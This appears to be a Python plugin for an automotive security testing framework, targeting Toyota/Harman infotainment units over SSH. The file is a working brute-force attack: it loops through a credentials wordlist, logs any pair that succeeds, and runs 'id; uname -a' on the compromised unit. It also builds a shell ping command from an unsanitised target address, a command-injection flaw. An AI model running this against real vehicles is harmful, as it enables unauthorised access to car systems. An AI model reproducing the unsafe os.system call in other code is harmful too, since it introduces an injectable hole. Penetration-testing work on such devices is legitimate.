import paramiko
import os
from iv_plugin_base import IVIVulnerabilityPlugin

class ToyotaHarmanSSHExploit(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        # 检查网络可达性
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址。")
        response = os.system(f"ping -c 1 {self.target_ip} > /dev/null 2>&1")
        if response != 0:
            self.logger.warning(f"目标 {self.target_ip} Ping不通, 但仍尝试连接...")
        return True

    def exploit(self):
        wordlist_path = os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'credentials.txt')
        if not os.path.exists(wordlist_path):
            self.logger.error("未找到字典文件 credentials.txt")
            self.results["vulnerable"] = False
            return self.results
            
        self.logger.info("开始基于车机通用安全字典的 SSH 硬编码爆破...")
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or ':' not in line:
                        continue
                        
                    parts = line.split(':', 1)
                    user = parts[0]
                    password = parts[1]
                    
                    try:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(self.target_ip, username=user, password=password, timeout=2, banner_timeout=2)
                        self.logger.warning(f">>> [+] 成功！利用已知凭证获取 Shell: {user}/{password} <<<")
                        
                        self.results["vulnerable"] = True
                        self.results["evidence"] = f"SSH Hardcoded/Default Credentials: {user}/{password}"
                        
                        # 执行命令验证权限
                        _, stdout, _ = client.exec_command('id; uname -a')
                        output = stdout.read().decode('utf-8', 'ignore').strip()
                        self.logger.info(f"    系统指纹: {output}")
                        
                        client.close()
                        return self.results
                    except paramiko.AuthenticationException:
                        continue
                    except Exception as e:
                        break
            
            self.logger.info("安全字典执行完毕，未匹配到任何已知的 SSH 后门或硬编码凭证。")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"字典读取或解析意外错误: {str(e)}")
            self.results["vulnerable"] = False
            
        return self.results